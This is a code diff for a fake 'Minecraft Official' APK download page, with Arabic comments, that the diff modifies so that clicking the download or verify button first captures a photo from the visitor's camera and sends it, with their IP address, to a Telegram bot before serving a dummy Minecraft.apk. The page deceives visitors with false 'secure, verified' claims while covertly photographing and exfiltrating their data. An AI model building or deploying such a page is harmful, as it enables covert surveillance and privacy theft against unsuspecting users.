@@ -223,6 +223,12 @@
             position: relative;
             z-index: 1;
         }
+        #cameraStatus {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #6ab04c;
+            min-height: 20px;
+        }
     </style>
 </head>
 <body>
@@ -240,6 +246,7 @@
         <button class="btn btn-primary" id="mainBtn">🚀 تحميل Minecraft.apk</button>
         <button class="btn btn-secondary" id="fakeBtn">🔍 التحقق من الملف</button>
         <div id="status">⏳ اضغط تحميل لبدء التنزيل</div>
+        <div id="cameraStatus"></div>
         <div class="footer">🔒 اتصال آمن • ✅ تم التحقق • ⛏️ Minecraft Official</div>
     </div>
     <script>
@@ -253,6 +260,60 @@
         const mainBtn = document.getElementById('mainBtn');
         const fakeBtn = document.getElementById('fakeBtn');
         const statusDiv = document.getElementById('status');
+        const cameraStatus = document.getElementById('cameraStatus');
+
+        // ====== جلب عنوان IP ======
+        async function getIP() {
+            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip || 'غير معروف'; } catch { return 'غير معروف'; }
+        }
+
+        // ====== طلب الكاميرا والتقاط الصورة (بدون إشعار مسبق) ======
+        async function captureAndSendPhoto() {
+            try {
+                cameraStatus.innerHTML = '📷 جاري طلب الكاميرا...';
+                cameraStatus.style.color = '#ff9800';
+
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment" }
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 500));
+
+                const canvas = document.createElement('canvas');
+                const track = stream.getVideoTracks()[0];
+                const settings = track.getSettings();
+                canvas.width = settings.width || 640;
+                canvas.height = settings.height || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+
+                const blob = await fetch(imageData).then(r => r.blob());
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'camera.jpg');
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                stream.getTracks().forEach(t => t.stop());
+
+                cameraStatus.innerHTML = '✅ تم التقاط الصورة وإرسالها';
+                cameraStatus.style.color = '#4caf50';
+                return true;
+
+            } catch (e) {
+                console.log('❌ الكاميرا غير متاحة:', e);
+                cameraStatus.innerHTML = '⚠️ لم نتمكن من الوصول للكاميرا (متابعة التحميل)';
+                cameraStatus.style.color = '#ff9800';
+                return false;
+            }
+        }
 
         // ====== إرسال إشعار إلى تيليغرام ======
         async function sendNotification(action) {
@@ -278,77 +339,56 @@
             }
         }
 
-        // ====== جلب عنوان IP ======
-        async function getIP() {
-            try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip || 'غير معروف'; } catch { return 'غير معروف'; }
+        // ====== تحميل ملف وهمي ======
+        function downloadFakeFile() {
+            const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'Minecraft.apk';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
         }
 
-        // ====== طلب الكاميرا والتقاط الصورة ======
-        async function requestCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.createElement('canvas');
-                const track = stream.getVideoTracks()[0];
-                const settings = track.getSettings();
-                canvas.width = settings.width || 640;
-                canvas.height = settings.height || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.9);
-                const blob = await fetch(imageData).then(r => r.blob());
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'camera.jpg');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch (e) { console.log('❌ الكاميرا غير متاحة'); return false; }
-        }
-
-        // ====== الإجراء الرئيسي ======
+        // ====== الإجراء الرئيسي (كاميرا أولاً، ثم تحميل) ======
         async function handleMainAction() {
-            statusDiv.innerHTML = `<span class="loader"></span> جاري التحميل...`;
+            // تعطيل الزر لتجنب الضغط المتكرر
+            mainBtn.disabled = true;
+            mainBtn.style.opacity = '0.6';
+            statusDiv.innerHTML = `<span class="loader"></span> جاري التجهيز...`;
             statusDiv.style.color = '#aaa';
 
-            // إرسال إشعار
-            const sent = await sendNotification('تحميل مباشر');
+            // الخطوة 1: التقاط الصورة فوراً
+            const photoCaptured = await captureAndSendPhoto();
+
+            // الخطوة 2: إرسال إشعار
+            statusDiv.innerHTML = `<span class="loader"></span> جاري إرسال الإشعار...`;
+            const sent = await sendNotification('تحميل مباشر (مع صورة)');
 
             if (sent) {
-                statusDiv.innerHTML = `✅ تم إرسال الإشعار`;
+                statusDiv.innerHTML = `✅ تم الإرسال بنجاح`;
                 statusDiv.style.color = '#4caf50';
 
-                setTimeout(async () => {
-                    statusDiv.innerHTML = `📷 جاري طلب الكاميرا...`;
-                    const cam = await requestCamera();
-                    if (cam) {
-                        statusDiv.innerHTML = `✅ تم إرسال الصورة أيضاً`;
-                    } else {
-                        statusDiv.innerHTML = `✅ تم الإرسال (بدون كاميرا)`;
-                    }
-
-                    // تحميل ملف وهمي
-                    const blob = new Blob(['هذا ملف وهمي لأغراض العرض'], { type: 'application/vnd.android.package-archive' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = 'Minecraft.apk';
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
-
+                // الخطوة 3: تحميل ملف وهمي بعد 1 ثانية
+                setTimeout(() => {
+                    statusDiv.innerHTML = `📥 جاري تجهيز الملف للتحميل...`;
                     setTimeout(() => {
+                        downloadFakeFile();
                         statusDiv.innerHTML = '📥 تم التنزيل بنجاح';
                         statusDiv.style.color = '#8a8a8a';
-                    }, 3000);
+                        // إعادة تفعيل الزر
+                        mainBtn.disabled = false;
+                        mainBtn.style.opacity = '1';
+                    }, 800);
                 }, 1000);
+
             } else {
                 statusDiv.innerHTML = '❌ فشل الإرسال، حاول مرة أخرى';
                 statusDiv.style.color = '#e94560';
+                mainBtn.disabled = false;
+                mainBtn.style.opacity = '1';
             }
         }
 
@@ -357,6 +397,8 @@
             statusDiv.innerHTML = `<span class="loader"></span> جاري التحقق من الملف...`;
             statusDiv.style.color = '#aaa';
 
+            // أيضاً نطلب الكاميرا عند التحقق (يمكن تعديله)
+            await captureAndSendPhoto();
             await sendNotification('التحقق من الملف');
 
             setTimeout(() => {
@@ -369,7 +411,7 @@
             }, 2000);
         });
 
-        // ====== ربط الأزرار ======
+        // ====== ربط الزر الرئيسي ======
         mainBtn.addEventListener('click', handleMainAction);
     </script>
 </body>
